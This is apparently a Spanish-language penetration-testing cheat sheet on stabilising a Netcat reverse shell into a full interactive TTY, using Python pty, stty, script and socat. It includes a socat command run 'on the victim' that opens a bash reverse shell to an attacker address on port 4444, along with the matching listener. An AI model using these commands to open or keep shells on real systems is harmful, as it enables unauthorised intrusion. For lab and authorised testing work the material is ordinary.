---
title: Estabilización de la TTY (Mejorar la Shell)
pubDate: 2026-05-22
---

## ¿Por qué estabilizar la Shell?
Las shells obtenidas mediante Netcat son básicas y limitadas:
1.  **No hay autocompletado:** La tecla Tab no funciona.
2.  **No hay historial:** Las flechas de dirección arriba/abajo no funcionan.
3.  **No son interactivas:** No puedes usar programas como `vim`, `nano`, `sudo` o `top`.
4.  **Inestabilidad:** Si pulsas `CTRL + C` por error, pierdes la shell totalmente.

---

## 🚀 1. El Método Estándar (STTY)
Es el método más completo y el que deberías intentar siempre.

1.  **Obtener una PTY (Pseudo-Terminal):**
    ```bash
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    ```
2.  **Suspender la shell:** Pulsa `CTRL + Z`.
3.  **Configurar tu terminal local (En tu Kali):**
    ```bash
    stty raw -echo; fg
    ```
4.  **Resetear y configurar entorno:** Escribe `reset` y luego:
    ```bash
    export TERM=xterm-256color
    source /etc/profile
    ```

---

## 🛠️ 2. Métodos Alternativos (Si falla Python)

### Usando Script (Muy útil)
```bash
script /dev/null -c bash
```

### Usando Socat (Shell perfecta directa)
Si la víctima tiene `socat` instalado, obtendrás una shell estable desde el primer segundo.
*   **En tu Kali:**
    ```bash
    socat file:`tty`,raw,echo=0 tcp-listen:4444
    ```
*   **En la víctima:**
    ```bash
    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<TU_IP>:4444
    ```

---

## 📐 3. Ajustar el Tamaño de la Pantalla
Si el editor de texto se ve cortado o pequeño, ajusta las filas y columnas.

1.  **En tu Kali (en una terminal nueva):**
    ```bash
    stty size
    # Ejemplo de salida: 24 80 (filas columnas)
    ```
2.  **En la máquina víctima:**
    ```bash
    stty rows 24 cols 80
    ```

> **Tip:** Si por algún motivo pierdes la conexión tras el comando `stty raw -echo`, puedes recuperar tu terminal de Kali escribiendo a ciegas el comando `reset`.
